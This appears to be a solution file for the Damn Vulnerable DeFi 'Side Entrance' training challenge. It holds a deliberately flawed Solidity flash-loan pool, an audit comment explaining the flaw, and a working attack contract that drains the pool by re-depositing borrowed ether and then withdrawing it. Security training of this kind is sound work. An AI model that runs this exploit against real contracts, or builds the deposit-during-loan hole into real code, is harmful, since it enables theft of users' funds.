// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
}


// @audit attacker can call pool.flashLoan(), then call pool.deposit() to
// deposit the pool's own ether, passing the if (address(this).balance < balanceBefore)
// check at the end of pool.flashLoan().
//
// But now the attacker has pool.balances[attacker] = borrowedAmount, so
// can call pool.withdraw() to drain the pool!
//
// Attacker used the pool's own ether to create a valid entry into pool.balances[attacker]
// that would allow a subsequent withdraw()
contract SideEntranceLenderPoolAttack {
    SideEntranceLenderPool pool;
    uint256 amount;

    function attack(address payable _pool, uint256 _amount) external {
        pool   = SideEntranceLenderPool(_pool);
        amount = _amount;

        pool.flashLoan(amount);
        pool.withdraw();
        // transfer stolen ether back to attacker
        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function execute() external payable {
        pool.deposit{value: amount}();
    }

    receive() external payable {}
}
